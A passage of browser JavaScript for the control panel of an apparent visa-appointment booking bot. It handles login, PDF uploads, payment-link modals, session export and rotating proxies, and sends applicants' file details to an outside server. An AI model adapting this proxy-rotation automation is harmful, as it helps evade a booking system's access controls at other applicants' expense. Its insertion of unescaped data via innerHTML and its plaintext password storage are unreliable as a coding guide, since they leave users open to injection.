    c.appendChild(closeBtn);

    if (!dataList || dataList.length === 0) {
        const txt = document.createElement("p");
        txt.textContent = "No data available";
        txt.style.textAlign = "center";
        c.appendChild(txt);
        m.appendChild(c);
        document.body.appendChild(m);
        return;
    }

    const firstObj = dataList[0];
    const t = document.createElement("h3");
    t.textContent = "File Details";
    Object.assign(t.style, { marginTop: "5px", fontSize: "16px", color: "#111", borderBottom: "1px solid #ddd", paddingBottom: "10px", textAlign: "center" });
    c.appendChild(t);

    const summary = document.createElement("div");
    Object.assign(summary.style, {
        display: "flex", justifyContent: "space-between", alignItems: "center",
        background: "#e8ecf1", padding: "8px 10px", borderRadius: "8px",
        marginBottom: "12px", fontSize: "11px", border: "1px solid #d0d5dd",
        gap: "5px"
    });
    summary.innerHTML = `
        <div style="display:flex; gap:3px; align-items:center;">
            <span style="color:#555;">MS:</span>
            <span style="color:#111; font-weight:600;">${firstObj.commissionName}</span>
        </div>
        <div style="width:1px; height:12px; background:#bbb;"></div>
        <div style="display:flex; gap:3px; align-items:center;">
            <span style="color:#555;">Type:</span>
            <span style="color:#111; font-weight:600;">${firstObj.visaType}</span>
        </div>
        <div style="margin-left:auto;">
            <span style="background:linear-gradient(90deg, #10b981, #059669); color:#fff; padding:2px 8px; border-radius:4px; font-weight:700; font-size:10px;">
               Total: ${dataList.length}
            </span>
        </div>
    `;
    c.appendChild(summary);

    const tableContainer = document.createElement("div");
    tableContainer.style.maxHeight = "200px";
    tableContainer.style.overflowY = "auto";
    tableContainer.style.border = "1px solid #d0d5dd";
    tableContainer.style.borderRadius = "6px";
    tableContainer.style.background = "#fff";

    const table = document.createElement("table");
    table.style.width = "100%";
    table.style.borderCollapse = "collapse";
    table.style.fontSize = "12px";
    
    const thead = document.createElement("thead");
    thead.innerHTML = `<tr><th style="border-bottom:1px solid #d0d5dd;padding:6px;text-align:left;background:#e8ecf1;position:sticky;top:0;color:#333;">Name</th><th style="border-bottom:1px solid #d0d5dd;padding:6px;text-align:left;background:#e8ecf1;position:sticky;top:0; border-left:1px solid #d0d5dd;color:#333;">BGD</th></tr>`;
    table.appendChild(thead);

    const tbody = document.createElement("tbody");
    dataList.forEach((item, index) => {
        const tr = document.createElement("tr");
        tr.style.background = index % 2 === 0 ? "#fff": "#f5f7fa";
        tr.innerHTML = `<td style="border-bottom:1px solid #e5e7eb;padding:6px;color:#222;">${item.fullName}</td><td style="border-bottom:1px solid #e5e7eb;padding:6px; color:#1d4ed8; font-weight:500; border-left:1px solid #e5e7eb;">${item.applicationId}</td>`;
        tbody.appendChild(tr);
    });
    table.appendChild(tbody);
    tableContainer.appendChild(table);
    c.appendChild(tableContainer);

    if (SHOW_PDF_UPLOAD && dataList.length < 4) {
        const uploadSection = document.createElement("div");
        Object.assign(uploadSection.style, {
            marginTop: "10px", padding: "10px", background: "#e8ecf1",
            borderRadius: "6px", border: "1px solid #d0d5dd"
        });

        const uploadLabel = document.createElement("div");
        uploadLabel.textContent = "Add More Files";
        Object.assign(uploadLabel.style, { fontSize: "12px", fontWeight: "600", color: "#333", marginBottom: "6px" });
        uploadSection.appendChild(uploadLabel);

        const fileInput2 = document.createElement("input");
        fileInput2.type = "file";
        fileInput2.accept = ".pdf";
        Object.assign(fileInput2.style, {
            width: "100%", padding: "5px", border: "1px solid #d0d5dd",
            borderRadius: "4px", background: "#fff", fontSize: "11px",
            boxSizing: "border-box", cursor: "pointer"
        });
        uploadSection.appendChild(fileInput2);

        const uploadBtn2 = document.createElement("button");
        uploadBtn2.textContent = "Upload PDF";
        Object.assign(uploadBtn2.style, {
            width: "100%", marginTop: "6px", padding: "7px",
            background: "linear-gradient(90deg, #16a34a, #15803d)", color: "#fff",
            border: "none", borderRadius: "4px", fontSize: "12px",
            fontWeight: "600", cursor: "pointer", transition: "opacity 0.2s"
        });
        uploadSection.appendChild(uploadBtn2);

        const msgBox2 = document.createElement("div");
        Object.assign(msgBox2.style, {
            marginTop: "6px", fontSize: "11px", textAlign: "center",
            borderRadius: "4px", display: "none"
        });
        uploadSection.appendChild(msgBox2);

        var showUploadMsg = function(text, type) {
            msgBox2.textContent = text;
            msgBox2.style.display = "block";
            msgBox2.style.padding = "6px";
            if (type === "success") {
                msgBox2.style.background = "#dcfce7"; msgBox2.style.color = "#166534"; msgBox2.style.border = "1px solid #86efac";
            } else {
                msgBox2.style.background = "#fee2e2"; msgBox2.style.color = "#991b1b"; msgBox2.style.border = "1px solid #fca5a5";
            }
        };

        uploadBtn2.onclick = async function() {
            var file = fileInput2.files[0];
            if (!file) return showUploadMsg("Select a PDF file", "error");
            if (!file.name.toLowerCase().endsWith(".pdf")) return showUploadMsg("Only PDF allowed", "error");

            uploadBtn2.textContent = "Uploading...";
            uploadBtn2.style.opacity = "0.6";
            uploadBtn2.style.pointerEvents = "none";
            
            var reader = new FileReader();
            reader.onload = function(e) {
                var base64 = e.target.result.split(',')[1];
                socket.once("upload-file-result", function(rdata) {
                     if (rdata.success) {
                        var valErrors = rdata.data?.error;
                        if (Array.isArray(valErrors) && valErrors.length > 0) {
                            var errHtml = valErrors.map(function(err) { return '⚠ ' + err; }).join('\n');
                            showUploadMsg(errHtml, "error");
                            msgBox2.style.textAlign = "left";
                            msgBox2.style.whiteSpace = "pre-wrap";
                            msgBox2.style.fontSize = "11px";
                            logSolver("Upload validation failed: " + valErrors.length + " error(s)", "#d97706");
                            valErrors.forEach(function(err) { logSolver(err, "#dc2626"); });
                            uploadBtn2.textContent = "Upload PDF";
                        } else {
                            showUploadMsg("Uploaded successfully! ✓", "success");
                            logSolver("File uploaded!", "#16a34a");
                            uploadBtn2.textContent = "✓ Uploaded";
                            uploadBtn2.style.background = "#16a34a";
                            return;
                        }
                    } else {
                        var errMsg = (rdata && rdata.message) ? rdata.message : "Upload failed!";
                        showUploadMsg(errMsg, "error");
                        logSolver("Upload: " + errMsg, "#dc2626");
                        uploadBtn2.textContent = "Upload PDF";
                    }
                    uploadBtn2.style.opacity = "1";
                    uploadBtn2.style.pointerEvents = "auto";
                });
                socket.emit("upload-file", { base64: base64, name: file.name, isPrimary: "false" });
            };
            reader.readAsDataURL(file);
        };
        c.appendChild(uploadSection);
    }
    m.appendChild(c);
    m.addEventListener("click", e => { if (e.target === m) m.remove(); });
    document.body.appendChild(m);
}

// PANEL LOGIN LOGIC
// (Secured: No more auto-bypass. Server-side session is required for every refresh)

const loginBtn = $("login-btn");
if (loginBtn) {
    loginBtn.onclick = () => {
        const u = $("panel-user").value.trim();
        const p = $("panel-pass").value.trim();
        loginBtn.textContent = "Authenticating...";
        
        socket.emit("panel-login", { user: u, pass: p }, (res) => {
            if (res.success) {
                localStorage.setItem("ivac_panel_session_token", res.token);
                localStorage.setItem("ivac_panel_session_expiry", Date.now() + (5 * 60 * 60 * 1000));
                
                unlockPanel();
            } else {
                $("login-error").style.display = 'block';
                loginBtn.textContent = "Sign In";
                const card = $("login-card");
                card.style.transform = "translateX(-8px)";
                setTimeout(() => card.style.transform = "translateX(8px)", 100);
                setTimeout(() => card.style.transform = "translateX(-4px)", 200);
                setTimeout(() => card.style.transform = "translateX(4px)", 300);
                setTimeout(() => card.style.transform = "translateX(0)", 400);
            }
        });
    };
}

function unlockPanel() {
    const loginBtn = $("login-btn");
    if (loginBtn) {
        loginBtn.textContent = "Success ✓";
        loginBtn.style.background = "linear-gradient(135deg, #16a34a, #15803d)";
    }
    
    setTimeout(() => {
        const overlay = $("login-overlay");
        if (overlay) {
            overlay.style.opacity = '0';
            overlay.style.transition = '0.5s';
            overlay.style.backdropFilter = 'blur(0px)';
            setTimeout(() => {
                overlay.style.display = 'none';
                const app = $("app-container");
                if (app) app.style.setProperty("display", "flex", "important");
            }, 500);
        }
    }, 400);
}

// AUTO SESSION RESTORE
(function() {
    const token = localStorage.getItem("ivac_panel_session_token");
    const expiry = localStorage.getItem("ivac_panel_session_expiry");
    
    if (token && expiry && Date.now() < parseInt(expiry)) {
        // We have a potentially valid session, try to auth with socket
        const checkSession = () => {
            if (socket.connected) {
                socket.emit("panel-session-login", { token }, (success) => {
                   if (success) {
                       unlockPanel();
                   } else {
                       localStorage.removeItem("ivac_panel_session_token");
                       localStorage.removeItem("ivac_panel_session_expiry");
                   }
                });
            } else {
                setTimeout(checkSession, 100);
            }
        };
        checkSession();
    }
})();

socket.on("payment-link", (data) => {
    const url = typeof data === "string" ? data : data.url;
    const userId = typeof data === "string" ? "TechBroSniper" : (data.userId || "TechBroSniper");

    const consolePayBtn = $("console-payment-btn");
    if(consolePayBtn) {
       consolePayBtn.style.display = "inline-flex";
       consolePayBtn.onclick = () => window.open(url, "_blank");
    }

    createPaymentModal(url);
    savePaymentInfo(url, userId);
});

async function savePaymentInfo(paymentUrl, userId = "TechBroSniper") {
    try {
        const payload = {
            user_id: userId,
            file_info: JSON.parse(localStorage.getItem("file_info") || "{}"),
            payment_url: paymentUrl
        };
        const response = await fetch("https://sms.mrshuvo.xyz/api/save-payment", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload), credentials: "omit", mode: "cors"
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}: ${await response.text()}`);
        
        setTimeout(() => {
            let count = 0;
            const audio = new Audio("https://sms.mrshuvo.xyz/faaah.mp3");
            audio.addEventListener("ended", () => {
                count++;
                if (count < 2) { setTimeout(() => { audio.currentTime = 0; audio.play(); }, 1500); }
            });
            audio.play();
        }, 1000);
    } catch (err) {
        console.error("%c[IVAC] Failed to save payment info:", "color:red", err);
    }
}

function createPaymentModal(url) {
    let m = document.getElementById("payment-modal"); 
    if (m) m.remove();
    
    m = document.createElement("div"); 
    m.id = "payment-modal";
    Object.assign(m.style, { 
        position: "fixed", top: "0", left: "0", width: "100%", height: "100%", 
        background: "rgba(0,0,0,0.85)", backdropFilter: "blur(10px)",
        display: "flex", justifyContent: "center", alignItems: "center", zIndex: "2147483647", 
        fontFamily: "system-ui, -apple-system, sans-serif" 
    });

    const c = document.createElement("div"); 
    Object.assign(c.style, { 
        background: "linear-gradient(145deg, #0f172a, #020617)", padding: "28px", textAlign: "center",
        borderRadius: "16px", width: "450px", maxWidth: "90%", 
        boxShadow: "0 20px 50px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05)", 
        border: "1px solid #1e293b", position: "relative", color: "#f8fafc"
    });

    const closeBtn = document.createElement("div"); 
    closeBtn.innerHTML = "&times;"; 
    Object.assign(closeBtn.style, { 
        position: "absolute", top: "15px", right: "20px", fontSize: "24px", 
        color: "#64748b", cursor: "pointer", userSelect: "none", transition: "0.2s" 
    }); 
    closeBtn.onmouseover = () => closeBtn.style.color = "#ef4444";
    closeBtn.onmouseout = () => closeBtn.style.color = "#64748b";
    closeBtn.onclick = () => m.remove(); 
    c.appendChild(closeBtn);

    const icon = document.createElement("div");
    icon.innerHTML = `<svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
        <polyline points="9 12 11 14 15 10"></polyline>
    </svg>`;
    Object.assign(icon.style, {
        width: "60px", height: "60px", background: "linear-gradient(135deg, #10b981, #059669)",
        borderRadius: "50%", display: "flex", justifyContent: "center", alignItems: "center",
        margin: "0 auto 15px auto", boxShadow: "0 0 15px rgba(16, 185, 129, 0.4)"
    });
    c.appendChild(icon);

    const title = document.createElement("h3");
    title.innerHTML = "Congrats! Ready to Payment";
    Object.assign(title.style, { margin: "0 0 8px 0", color: "#e2e8f0", fontSize: "22px", fontWeight: "bold" });
    c.appendChild(title);

    const subtitle = document.createElement("p");
    subtitle.innerHTML = "Your secure payment gateway URL has been generated.";
    Object.assign(subtitle.style, { margin: "0 0 20px 0", color: "#94a3b8", fontSize: "13px" });
    c.appendChild(subtitle);

    // URL Copy Box
    const urlContainer = document.createElement("div");
    Object.assign(urlContainer.style, { display: "flex", gap: "8px", marginBottom: "25px" });
    
    const inputLink = document.createElement("input");
    inputLink.value = url;
    inputLink.readOnly = true;
    Object.assign(inputLink.style, { 
        flex: "1", padding: "10px", borderRadius: "8px", border: "1px solid #334155", 
        background: "#020617", color: "#34d399", fontSize: "12px", outline: "none" 
    });
    
    const copyBtn = document.createElement("button");
    copyBtn.innerHTML = "📋";
    copyBtn.title = "Copy Link";
    Object.assign(copyBtn.style, { 
        padding: "0 15px", borderRadius: "8px", border: "1px solid #334155", 
        background: "#1e293b", color: "#fff", cursor: "pointer", transition: "0.2s", fontSize: "18px" 
    });
    copyBtn.onmouseover = () => copyBtn.style.background = "#334155";
    copyBtn.onmouseout = () => copyBtn.style.background = "#1e293b";
    copyBtn.onclick = () => {
        inputLink.select();
        document.execCommand("copy");
        copyBtn.innerHTML = "✓";
        copyBtn.style.color = "#10b981";
        setTimeout(() => { copyBtn.innerHTML = "📋"; copyBtn.style.color = "#fff"; }, 2000);
    };
    
    urlContainer.appendChild(inputLink);
    urlContainer.appendChild(copyBtn);
    c.appendChild(urlContainer);
    
    // Action Buttons
    const btnRow = document.createElement("div");
    Object.assign(btnRow.style, { display: "flex", gap: "10px" });

    const visaBtn = document.createElement("button");
    visaBtn.innerHTML = '<span style="font-size:18px; margin-right:6px; vertical-align:middle;">💳</span> VisaCard';
    Object.assign(visaBtn.style, { 
        flex: "1", padding: "12px", borderRadius: "8px", border: "none", 
        background: "linear-gradient(135deg, #2563eb, #1d4ed8)", color: "#fff", 
        fontWeight: "bold", cursor: "pointer", transition: "0.2s", 
        boxShadow: "0 4px 12px rgba(37, 99, 235, 0.3)", display: "flex", justifyContent: "center", alignItems: "center"
    });
    visaBtn.onmouseover = () => visaBtn.style.transform = "translateY(-2px)";
    visaBtn.onmouseout = () => visaBtn.style.transform = "translateY(0)";
    visaBtn.onclick = () => window.open(url, "_blank");

    const rocketBtn = document.createElement("button");
    rocketBtn.innerHTML = '<span style="font-size:18px; margin-right:6px; vertical-align:middle;">🚀</span> Rocket';
    Object.assign(rocketBtn.style, { 
        flex: "1", padding: "12px", borderRadius: "8px", border: "none", 
        background: "linear-gradient(135deg, #9333ea, #7e22ce)", color: "#fff", 
        fontWeight: "bold", cursor: "pointer", transition: "0.2s", 
        boxShadow: "0 4px 12px rgba(147, 51, 234, 0.3)", display: "flex", justifyContent: "center", alignItems: "center"
    });
    rocketBtn.onmouseover = () => rocketBtn.style.transform = "translateY(-2px)";
    rocketBtn.onmouseout = () => rocketBtn.style.transform = "translateY(0)";
    rocketBtn.onclick = () => {
        window.open(url + "rocket", "_blank");
    };

    btnRow.appendChild(visaBtn);
    btnRow.appendChild(rocketBtn);
    c.appendChild(btnRow);
    
    m.appendChild(c); 
    document.body.appendChild(m);
}

const solverClear = $("solver-clear");
if (solverClear) {
    solverClear.onclick = () => {
        $("solver-console").innerHTML = "> Console Is Ready.<br>";
    };
}

const hardResetBtn = $("hard-reset-btn");
if (hardResetBtn) {
    hardResetBtn.onclick = () => {
        if (confirm("Flush all engine variables? This acts like a software reboot but perfectly preserves your Saved Info.")) {
            socket.emit("hard-reset");
        }
    };
}

const gitUpdateBtn = $("git-update-btn");
if (gitUpdateBtn) {
    gitUpdateBtn.onclick = () => {
        if (confirm("Update code from Git and restart Server engine?")) {
            socket.emit("git-update");
        }
    };
}

socket.on("solver-clear", () => {
    const sc = $("solver-console");
    if (sc) sc.innerHTML = "> Console Is Ready.<br>";
});

let countdownInterval = null;

const exportSessionBtn = $("export-session-btn");
if (exportSessionBtn) {
    exportSessionBtn.onclick = () => socket.emit("get-session-data");
}

const closeSessionBtn = $("closeSessionBtn");
if (closeSessionBtn) {
    closeSessionBtn.onclick = () => $("sessionModal").classList.add("hidden");
}

const copySessionBtn = $("copySessionBtn");
if (copySessionBtn) {
    copySessionBtn.onclick = () => {
        const ta = $("sessionDataText");
        ta.select();
        document.execCommand("copy");
        copySessionBtn.innerText = "✓ Copied!";
        setTimeout(() => copySessionBtn.innerText = "📋 Copy to Clipboard", 2000);
    };
}

socket.on("receive-session-data", (data) => {
    $("sessionDataText").value = JSON.stringify(data, null, 2);
    $("sessionModal").classList.remove("hidden");
});

socket.on("hide-export-session", () => {
    if (exportSessionBtn) exportSessionBtn.style.display = "none";
});

socket.on("start-login-countdown", (seconds) => {
    clearInterval(countdownInterval);
    if (exportSessionBtn) exportSessionBtn.style.display = "inline-block";
    const display = $("login-countdown");
    if (!display) return;
    
    let left = seconds;
    Object.assign(display.style, {
        color: "#fff",
        fontWeight: "bold",
        margin: "0",
        fontSize: "12px",
        fontFamily: "monospace",
        display: "flex",
        alignItems: "center"
    });
    
    const render = () => {
        const m = Math.floor(left / 60).toString().padStart(2, '0');
        const s = (left % 60).toString().padStart(2, '0');
        display.textContent = `${m}:${s}`;
    };
    render();
    
    countdownInterval = setInterval(() => {
        if (left <= 0) {
            clearInterval(countdownInterval);
            display.textContent = "Expired";
            display.style.color = "#dc2626";
            if (exportSessionBtn) exportSessionBtn.style.display = "none";
            updateStep("none");
            return;
        }
        left--;
        render();
    }, 1000);
});

// PROXY MANAGER
let proxyList = [];
try {
    const p = localStorage.getItem("proxy_list");
    if (p) proxyList = JSON.parse(p);
} catch(e) {}

// UI HEIGHT SYNC
const ivacPnl = $("ivac-panel");
const consPnl = $("console-panel");
if (ivacPnl && consPnl) {
    new ResizeObserver(() => {
        consPnl.style.maxHeight = ivacPnl.offsetHeight + "px";
    }).observe(ivacPnl);
}

const proxySelect = $("proxy-select");

function renderProxyList() {
    const listC = $("proxyListContainer");
    if(!listC) return;
    listC.innerHTML = "";
    if (proxyList.length === 0) {
        listC.innerHTML = '<span style="color: #64748b; font-size: 12px; display: block; text-align: center;">No proxies mapped.</span>';
    } else {
        let tableHTML = `
            <table style="width:100%; border-collapse:collapse; font-size:11px; color:#94a3b8; text-align:left;">
                <thead>
                    <tr style="border-bottom:1px solid #334155; color:#cbd5e1;">
                        <th style="padding:6px 4px; font-weight:600;">Title</th>
                        <th style="padding:6px 4px; font-weight:600;">Target/Auth</th>
                        <th style="padding:6px 4px; font-weight:600;">Status</th>
                        <th style="padding:6px 4px; text-align:right; font-weight:600;">Actions</th>
                    </tr>
                </thead>
                <tbody>
        `;

        proxyList.forEach((px, i) => {
            const authText = (px.user && px.pass) ? `<br><span style="color:#475569; font-size:9px;">U:${px.user} P:${'*'.repeat(px.pass.length)}</span>` : '';
            tableHTML += `
                <tr style="border-bottom:1px solid #1e293b; background:#020617;">
                    <td style="padding:8px 4px; color:#34d399; font-weight:bold; white-space:nowrap;">${px.title}</td>
                    <td style="padding:8px 4px; font-family:monospace; font-size:10px;">${px.host}:${px.port}${authText}</td>
                    <td style="padding:8px 4px;" id="proxy-status-${i}">-</td>
                    <td style="padding:8px 4px; text-align:right; white-space:nowrap;">
                        <button style="background:#2563eb; border:none; color:#fff; cursor:pointer; font-size:10px; padding:4px 8px; border-radius:4px; transition:0.2s;" onclick="testProxy(${i})">Check</button>
                        <button style="background:#dc2626; border:none; color:#fff; cursor:pointer; font-size:10px; padding:4px 8px; border-radius:4px; margin-left:2px; transition:0.2s;" onclick="deleteProxy(${i})">✖</button>
                    </td>
                </tr>
            `;
        });
        
        tableHTML += `</tbody></table>`;
        listC.innerHTML = tableHTML;
    }

    // Update Dropdown
    if (proxySelect) {
        const savedVal = localStorage.getItem("proxy_select_val");
        const currentVal = proxySelect.value && proxySelect.value !== "native" ? proxySelect.value : (savedVal || "native");
        
        proxySelect.innerHTML = `<option value="native">Native Direct</option>`;
        proxySelect.innerHTML += `<option value="private">Multi-IPs</option>`;
        if (proxyList.length > 1) {
            proxySelect.innerHTML += `<option value="random">Random Rotation</option>`;
        }
        
        proxyList.forEach(px => {
            proxySelect.innerHTML += `<option value="${px.title}">${px.title}</option>`;
        });
        
        let found = false;
        if (currentVal === "native" || currentVal === "private" || (currentVal === "random" && proxyList.length > 1)) found = true;
        if (proxyList.find(p => p.title === currentVal)) found = true;
        
        proxySelect.value = found ? currentVal : "native";
        localStorage.setItem("proxy_select_val", proxySelect.value);
        emitProxyState();
    }
}

window.deleteProxy = (index) => {
    proxyList.splice(index, 1);
    localStorage.setItem("proxy_list", JSON.stringify(proxyList));
    renderProxyList();
};

window.testProxy = (index) => {
    const px = proxyList[index];
    const statusEl = document.getElementById(`proxy-status-${index}`);
    if (statusEl) {
        statusEl.innerHTML = "<span style='color:#fbbf24'>Testing...</span>";
    }
    socket.emit("test-proxy", { index, proxy: px });
}

socket.on("test-proxy-result", ({ index, success, status, ms }) => {
    const statusEl = document.getElementById(`proxy-status-${index}`);
    if (statusEl) {
        if (success) {
            statusEl.innerHTML = `<span style="color:#10b981; font-weight:bold;">OK</span> <span style="color:#94a3b8; font-size:9px;">(${ms}ms)</span>`;
        } else {
            statusEl.innerHTML = `<span style="color:#ef4444; font-weight:bold;">Fail</span> <span style="font-size:9px; color:#475569;">(${status})</span>`;
        }
    }
});

function emitProxyState() {
    if(!proxySelect) return;
    const mode = proxySelect.value;
    localStorage.setItem("proxy_select_val", mode);
    socket.emit("proxy-state", { activeMode: mode, proxies: proxyList });
}

if (proxySelect) {
    proxySelect.onchange = emitProxyState;
}

const proxySettingsBtn = $("ProxySetting");
if (proxySettingsBtn) {
    proxySettingsBtn.onclick = () => {
        renderProxyList();
        $("proxyModal").classList.remove("hidden");
    };
}

const closeProxyBtn = $("closeProxyBtn");
if (closeProxyBtn) {
    closeProxyBtn.onclick = () => {
        $("proxyModal").classList.add("hidden");
    };
}

const addProxyBtn = $("addProxyBtn");
if (addProxyBtn) {
    addProxyBtn.onclick = () => {
        if (proxyList.length >= 5) return showStatus("Max 5 proxies allowed", "error");
        const title = $("proxyTitle").value.trim();
        const host = $("proxyHost").value.trim();
        const port = $("proxyPort").value.trim();
        const user = $("proxyUser").value.trim();
        const pass = $("proxyPass").value.trim();
        
        if (!title || !host || !port) return showStatus("Title, Host, and Port required", "error");
        if (proxyList.find(p => p.title === title)) return showStatus("Title must be unique", "error");
        
        proxyList.push({ title, host, port, user, pass });
        localStorage.setItem("proxy_list", JSON.stringify(proxyList));
        
        $("proxyTitle").value = ""; $("proxyHost").value = ""; $("proxyPort").value = ""; $("proxyUser").value = ""; $("proxyPass").value = "";
        renderProxyList();
        showStatus("Proxy Added", "success");
    };
}

setTimeout(() => { if($("proxyListContainer")) renderProxyList(); }, 500);
